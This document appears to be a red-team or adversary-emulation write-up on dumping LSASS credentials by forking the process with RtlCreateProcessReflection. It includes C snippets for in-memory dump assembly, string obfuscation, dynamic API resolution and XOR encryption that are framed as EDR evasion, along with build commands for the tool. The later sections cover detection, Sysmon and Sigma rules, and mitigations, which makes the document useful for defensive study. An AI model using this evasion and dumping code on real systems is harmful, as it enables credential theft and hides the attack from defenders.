# LSASS Memory Dumping via Process Reflection

## Overview

Process Reflection is an advanced LSASS credential dumping technique that uses the undocumented Windows Native API `RtlCreateProcessReflection` to **fork the LSASS process** rather than directly dumping it. The clone (reflection) is dumped instead of LSASS itself, significantly reducing detection surface by:

1. **Avoiding direct LSASS handle operations** - the dump handle points to the reflection PID, not LSASS
2. **Eliminating process name correlation** - the reflection does not carry the `lsass.exe` name
3. **Bypassing signature-based detection** - dump is assembled in-memory via callback, XOR-encrypted before disk write

This approach defeats most EDR behavioral detectors that monitor for `OpenProcess(lsass.exe) → MiniDumpWriteDump` chains.

---

## Technique Comparison: Classic vs. Reflection-Based

### Classic LSASS Dump (Widely Detected)

```
┌─────────────────────────────────────────────────────────────┐
│ 1. OpenProcess(lsass.exe, PROCESS_ALL_ACCESS, lsass_pid)   │
│    └─ EDR Alert: Process handle open to LSASS              │
│                                                             │
│ 2. MiniDumpWriteDump(lsass_handle, output_file.dmp)        │
│    └─ EDR Alert: dbghelp.dll loaded + LSASS memory read    │
│                                                             │
│ 3. Output: lsass.dmp on disk                                │
│    └─ Signature: MDMP magic bytes + cleartext credentials   │
└─────────────────────────────────────────────────────────────┘
```

**Detection Opportunities:**
- Sysmon EventCode=10: PROCESS_ALL_ACCESS handle to lsass.exe
- Sysmon EventCode=7: dbghelp.dll module load
- Sysmon EventCode=11: `.dmp` file creation with MDMP header
- Behavioral chain: lsass access → memory read → file write

---

### Process Reflection Dump (This Technique)

```
┌─────────────────────────────────────────────────────────────┐
│ 1. OpenProcess(lsass.exe, PROCESS_ALL_ACCESS, lsass_pid)   │
│    └─ Observable: Sysmon EventCode=10 (still required!)    │
│                                                             │
│ 2. RtlCreateProcessReflection(lsass_handle, &reflection)   │
│    └─ Creates fork under NEW PID (not named lsass.exe)     │
│    └─ Observable: Sysmon EventCode=1 (reflection PID)      │
│                                                             │
│ 3. MiniDumpWriteDump(reflection_handle, callback_buffer)   │
│    └─ Dumps the fork, not LSASS                            │
│    └─ Callback intercepts I/O → writes to heap buffer      │
│    └─ No direct file I/O from MiniDumpWriteDump API        │
│                                                             │
│ 4. XorBuffer(buffer, size, 0x35)                            │
│    └─ Encrypt in-place (in-memory operation)               │
│                                                             │
│ 5. WriteFile("f.elif", encrypted_buffer)                    │
│    └─ Single write call, no MDMP magic on disk             │
│    └─ Non-standard extension, opaque binary                │
│                                                             │
│ 6. TerminateProcess(reflection_handle)                      │
│    └─ Clean up the fork                                     │
└─────────────────────────────────────────────────────────────┘
```

**Detection Challenges:**
- Handle open is to LSASS (still observable) but dump target is the reflection
- Reflection PID does not carry security-critical process name
- Memory buffer assembly defeats file-write-based detection
- XOR encryption eliminates static signatures
- Behavioral chain is fragmented: LSASS access → fork creation → non-.dmp file write

---

## Technical Deep Dive

### RtlCreateProcessReflection API

**Signature:**
```c
NTSTATUS RtlCreateProcessReflection(
    HANDLE ProcessHandle,           // Source process (LSASS)
    ULONG Flags,                    // Reflection flags
    PVOID StartRoutine,             // Entry point (NULL for suspended)
    PVOID StartContext,             // Context (NULL)
    HANDLE EventHandle,             // Completion event (NULL)
    PRTL_PROCESS_REFLECTION_INFORMATION ReflectionInformation  // Output
);
```

**Behavior:**
- **Undocumented** ntdll.dll export (not in public Windows SDK)
- Creates a **full process fork** (similar to POSIX `fork()`)
- Fork is created in **suspended state** with new PID
- Fork inherits memory, handles, modules from source process
- Fork does **not inherit** process name or security descriptors from source

**Why EDR Misses It:**
- Behavioral rules look for: `OpenProcess(lsass.exe) → MiniDumpWriteDump(lsass handle)`
- This technique: `OpenProcess(lsass.exe) → RtlCreateProcessReflection → MiniDumpWriteDump(fork handle)`
- The dump handle points to the fork PID, which has no `lsass.exe` name correlation
- EDR cannot easily distinguish "fork of LSASS" from "random suspended process"

---

### MINIDUMP_CALLBACK_INFORMATION Mechanism

**Classic MiniDumpWriteDump:**
```c
MiniDumpWriteDump(
    process_handle,
    process_id,
    file_handle,        // ← Writes directly to disk
    MiniDumpWithFullMemory,
    NULL, NULL, NULL
);
```
→ Output: file on disk with MDMP magic bytes, readable credential strings

**Callback-Based MiniDumpWriteDump (This Technique):**
```c
MINIDUMP_CALLBACK_INFORMATION callback_info = {
    .CallbackRoutine = DiagBufferCallback,   // Custom callback
    .CallbackParam = &g_DiagBuffer           // Heap buffer pointer
};

MiniDumpWriteDump(
    reflection_handle,
    reflection_pid,
    NULL,               // ← No file handle!
    MiniDumpWithFullMemory,
    NULL, NULL,
    &callback_info      // ← Callback intercepts all I/O
);
```

**DiagBufferCallback Implementation:**
```c
BOOL CALLBACK DiagBufferCallback(
    PVOID CallbackParam,
    PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    if (CallbackInput->CallbackType == IoWriteAllCallback) {
        // Intercept I/O write request
        LPVOID buffer = CallbackInput->Io.Buffer;
        ULONG size = CallbackInput->Io.BufferBytes;
        
        // Copy to heap buffer instead of writing to file
        memcpy(g_DiagBuffer + g_BufferOffset, buffer, size);
        g_BufferOffset += size;
        
        // Tell MiniDumpWriteDump the write succeeded
        CallbackOutput->Status = S_OK;
        return TRUE;
    }
    return TRUE;
}
```

**Result:**
- Entire minidump assembled in **75 MB heap buffer** (`g_DiagBuffer`)
- MiniDumpWriteDump API never touches disk
- Single `WriteFile` call writes the full buffer at once
- XOR encryption applied in-place **before** WriteFile

---

### Evasion Techniques Employed

#### 1. Dynamic API Resolution (T1027.007)

**Problem:** `RtlCreateProcessReflection` in IAT → static detection  
**Solution:** Runtime resolution via `GetProcAddress`

```c
// API name absent from static strings
char api_name[] = {'R','t','l','C','r','e','a','t','e',
                   'P','r','o','c','e','s','s',
                   'R','e','f','l','e','c','t','i','o','n',0};

HMODULE ntdll = GetModuleHandleA("ntdll.dll");
RtlCreateProcessReflectionFunc pReflect = 
    (RtlCreateProcessReflectionFunc)GetProcAddress(ntdll, api_name);
```

**Detection Bypass:**
- String scanning: API name not in `.rdata` section
- IAT scanning: No import entry for `RtlCreateProcessReflection`
- Yara rules: String literal `"RtlCreateProcessReflection"` not present

---

#### 2. In-Memory XOR Encryption (T1027.013)

**Problem:** MDMP header on disk → signature detection  
**Solution:** XOR-encrypt buffer before `WriteFile`

```c
void XorBuffer(LPVOID buffer, DWORD size, BYTE key) {
    BYTE* ptr = (BYTE*)buffer;
    for (DWORD i = 0; i < size; i++) {
        ptr[i] ^= key;
    }
}

// After MiniDumpWriteDump completes into g_DiagBuffer:
XorBuffer(g_DiagBuffer, g_BufferOffset, 0x35);
WriteFile(hFile, g_DiagBuffer, g_BufferOffset, &written, NULL);
```

**File on Disk:**
```
Classic dump: 4D 44 4D 50 ... (MDMP magic)
This tool:    78 71 78 65 ... (XOR-encrypted, no magic)
```

**Detection Bypass:**
- File magic scanning: No MDMP, PE, or known credential patterns
- Content inspection: Encrypted bytes appear as random noise
- Extension rules: `.elif` extension, not `.dmp`

---

#### 3. Runtime String Assembly

**Problem:** `"lsass.exe"` in binary strings → YARA detection  
**Solution:** Assemble target name at runtime

```c
wchar_t target_name[32];
target_name[0] = L'l';
target_name[1] = L's';
target_name[2] = L'a';
target_name[3] = L's';
target_name[4] = L's';
target_name[5] = L'.';
target_name[6] = L'e';
target_name[7] = L'x';
target_name[8] = L'e';
target_name[9] = 0;

// Use in Process32NextW comparison
if (wcscmp(pe32.szExeFile, target_name) == 0) {
    lsass_pid = pe32.th32ProcessID;
}
```

**Detection Bypass:**
- Static string table: `"lsass.exe"` not present
- Automated triage: Binary does not reference security-critical process names

---

## Observable Detection Opportunities

Despite evasion techniques, the following telemetry remains **observable via Sysmon/EDR**:

### 1. LSASS Handle Open (Sysmon EventCode=10)

```xml
<Event>
  <EventID>10</EventID>
  <SourceImage>C:\Windows\Temp\WdiBoot.exe</SourceImage>
  <TargetImage>C:\Windows\System32\lsass.exe</TargetImage>
  <GrantedAccess>0x1FFFFF</GrantedAccess>  <!-- PROCESS_ALL_ACCESS -->
</Event>
```

**Detection Value:**
- Unsigned binary from `C:\Windows\Temp` opening LSASS
- PROCESS_ALL_ACCESS (0x1FFFFF) is excessive for legitimate operations
- **Key Weakness:** Still creates initial LSASS handle (required for RtlCreateProcessReflection)

---

### 2. Suspicious Process Creation (Sysmon EventCode=1)

```xml
<Event>
  <EventID>1</EventID>
  <ParentImage>C:\Windows\Temp\WdiBoot.exe</ParentImage>
  <Image>C:\Windows\System32\???</Image>  <!-- Reflection PID -->
  <CommandLine></CommandLine>  <!-- Empty/suspended -->
</Event>
```

**Detection Value:**
- WdiBoot.exe creates a suspended child process with no command line
- Reflection inherits LSASS modules (ntdll.dll, lsasrv.dll) → unusual module load pattern
- Process tree anomaly: SYSTEM process spawning from Temp binary

---

### 3. dbghelp.dll Module Load (Sysmon EventCode=7)

```xml
<Event>
  <EventID>7</EventID>
  <Image>C:\Windows\Temp\WdiBoot.exe</Image>
  <ImageLoaded>C:\Windows\System32\dbghelp.dll</ImageLoaded>
</Event>
```

**Detection Value:**
- dbghelp.dll (MiniDumpWriteDump export) loaded by unsigned binary from Temp
- Correlation: dbghelp load + LSASS handle open within short time window

---

### 4. Non-Standard File Creation (Sysmon EventCode=11)

```xml
<Event>
  <EventID>11</EventID>
  <Image>C:\Windows\Temp\WdiBoot.exe</Image>
  <TargetFilename>C:\Windows\Temp\f.elif</TargetFilename>
  <CreationUtcTime>2026-05-24 10:05:32.123</CreationUtcTime>
</Event>
```

**Detection Value:**
- Large file (tens of MB) written by same process that opened LSASS
- Non-standard extension (`.elif`)
- Single WriteFile call (unusual for large files - typically chunked)
- High entropy content (encrypted bytes)

---

### 5. Process Termination (Sysmon EventCode=5)

```xml
<Event>
  <EventID>5</EventID>
  <Image>C:\Windows\System32\???</Image>  <!-- Reflection PID -->
  <ProcessID>XXXX</ProcessID>
</Event>
```

**Detection Value:**
- Short-lived process (created and terminated within 10 seconds)
- Terminated by WdiBoot.exe (parent)

---

## Detection Strategy

### Behavioral Chain (Recommended)

Correlate Sysmon events within a **15-second window**:

```
EventCode=10 (LSASS handle open by WdiBoot.exe)
  ↓
EventCode=7 (dbghelp.dll load by WdiBoot.exe)
  ↓
EventCode=1 (Suspended process created by WdiBoot.exe)
  ↓
EventCode=11 (Large file creation by WdiBoot.exe)
  ↓
EventCode=5 (Suspended process terminated)
```

**Alert Trigger:**
- LSASS access + dbghelp load + large file write by same unsigned binary from non-system path

---

### Content-Based Detection

#### File Analysis
```bash
# Decrypt XOR-encrypted dump
python -c "data=open('f.elif','rb').read(); \
           open('decrypted.bin','wb').write(bytes(b^0x35 for b in data))"

# Check for MDMP magic after decryption
xxd decrypted.bin | head
# Should show: 4d 44 4d 50 (MDMP)
```

#### Entropy Analysis
```bash
# High entropy indicates encryption
ent f.elif
# Expected: Entropy = 7.9+ bits per byte (encrypted)
```

---

### Memory Analysis (Real-Time)

#### Detect `g_DiagBuffer` Allocation
```
Volatility3 → windows.memmap
  ├─ Look for 75 MB heap allocation
  └─ Check allocation origin: HeapAlloc from WdiBoot.exe
```

#### Detect RtlCreateProcessReflection Call
```
Volatility3 → windows.callbacks
  ├─ Check ntdll.dll exports usage
  └─ Identify RtlCreateProcessReflection in call stack
```

---

## Mitigation Strategies

### 1. PPL (Protected Process Light) for LSASS

**Windows Defender Credential Guard** or **ASR Rule**:
```powershell
# Enable Credential Guard (requires UEFI, Secure Boot)
Set-ProcessMitigation -System -Enable EnableCredentialGuard

# OR: ASR Rule - Block credential stealing from lsass.exe
Add-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 `
                 -AttackSurfaceReductionRules_Actions Enabled
```

**Effect:**
- LSASS runs as Protected Process
- `OpenProcess(lsass.exe, PROCESS_ALL_ACCESS)` fails with `ERROR_ACCESS_DENIED`
- RtlCreateProcessReflection cannot fork a protected process

---

### 2. Sysmon Rule: LSASS Handle Open by Unsigned Binary

```xml
<RuleGroup name="LSASS Access Detection">
  <ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
    <GrantedAccess condition="contains">0x1FFFFF</GrantedAccess>
    <SourceImage condition="excludes">C:\Windows\System32\</SourceImage>
  </ProcessAccess>
</RuleGroup>
```

---

### 3. Block Unsigned Binaries from Temp Folders

**Application Control (WDAC/AppLocker)**:
```xml
<FilePathRule Id="Block-Temp-Exe" Action="Deny">
  <Conditions>
    <FilePathCondition Path="%TEMP%\*.exe" />
    <FilePathCondition Path="C:\Windows\Temp\*.exe" />
  </Conditions>
</FilePathRule>
```

---

### 4. Monitor dbghelp.dll Loads Outside Debugging Contexts

**Elastic/Sigma Rule:**
```yaml
title: dbghelp.dll loaded by non-debugger process
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 7
    ImageLoaded|endswith: '\dbghelp.dll'
  filter:
    Image|startswith:
      - 'C:\Program Files\Microsoft Visual Studio\'
      - 'C:\Windows\System32\WerFault.exe'
  condition: selection and not filter
```

---

## ATT&CK Mapping

| Tactic | Technique | Relevance |
|--------|-----------|-----------|
| **Execution** | T1106 - Native API | RtlCreateProcessReflection is undocumented ntdll.dll API |
| **Credential Access** | T1003.001 - LSASS Memory | Primary objective: dump LSASS credentials |
| **Defense Evasion** | T1027.007 - Dynamic API Resolution | Runtime GetProcAddress for RtlCreateProcessReflection |
| **Defense Evasion** | T1027.013 - Encrypted/Encoded File | XOR-encrypt dump buffer before disk write |
| **Defense Evasion** | T1036.005 - Masquerading | WdiBoot.exe mimics Windows Diagnostics, f.elif non-standard extension |
| **Defense Evasion** | T1678 - Delay Execution | Two 5-second Sleep() calls to evade rapid-sequence detectors |
| **Discovery** | T1057 - Process Discovery | CreateToolhelp32Snapshot to locate LSASS PID |

---

## References

- **Deep Instinct Blog**: [Dirty Vanity - A New Approach to Code Injection & EDR Bypass](https://www.deepinstinct.com/blog/dirty-vanity-a-new-approach-to-code-injection-edr-bypass)
- **MITRE ATT&CK**: [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **MITRE ATT&CK**: [T1106 - Native API](https://attack.mitre.org/techniques/T1106/)
- **Windows Internals**: Process Forking via RtlCreateProcessReflection (undocumented)

---

## Building the Tool

See [`../../resources/payloads/LsassReflectDumping/README.md`](../../resources/payloads/LsassReflectDumping/README.md) for:
- Complete execution flow with phase breakdown
- Full Native API call listing with observable events
- Source code structure and implementation details
- Build instructions and usage examples

```powershell
# Quick Build
msbuild resources\payloads\LsassReflectDumping\ReflectDump\ReflectDump.sln `
        /p:Configuration=Release /p:Platform=x64 /m

# Output
resources\payloads\LsassReflectDumping\ReflectDump\x64\Release\ReflectDump.exe
```

---

## See Also

- [`../../resources/payloads/LsassReflectDumping/README.md`](../../resources/payloads/LsassReflectDumping/README.md) - Tool documentation and execution flow
- [`../iis-apppool-escalation-path/Phase 2.md`](../iis-apppool-escalation-path/Phase 2.md) - Emulation plan usage in Step 3
- [`evasion-techniques.md`](evasion-techniques.md) - Broader catalog of detection evasion methods
